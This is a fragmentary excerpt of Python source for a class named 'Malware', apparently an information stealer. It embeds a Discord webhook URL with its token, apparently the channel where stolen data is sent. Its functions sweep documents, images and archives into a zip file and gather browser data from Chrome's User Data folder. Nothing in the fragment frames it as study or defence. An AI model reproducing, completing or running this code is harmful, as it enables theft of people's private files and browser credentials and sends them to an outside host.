...
class Malware:
    def __init__(self):
        ...
        self.webhook_url = "https://discord.com/api/webhooks/1454135119882489919/4sKTWDGxnrzDu6_ergghKh1KnUXQfXJE83e3I4dSTbxjkHbBv4iOlUD6VQmLyQghsJAn"
...
{IPinfos}
    ...
    def Interesting_Files(zip_file):
        ...
        extensions = ('.txt', '.log', '.ini', '.json', '.xml', '.csv', '.rtf', '.cfg', '.conf','.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff', 'svg', '.webp', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ptx', '.zip', '.rar', '.7z', '.ogg'
        )
    ...
    def Browser_Infos(zip_file, browser_choice):
        ...
        browser_files = [
            ...
            ("Chromium Chrome",        os.path.join(path_appdata_local,   "Chrome", "User Data"),                           "chrome.exe"),
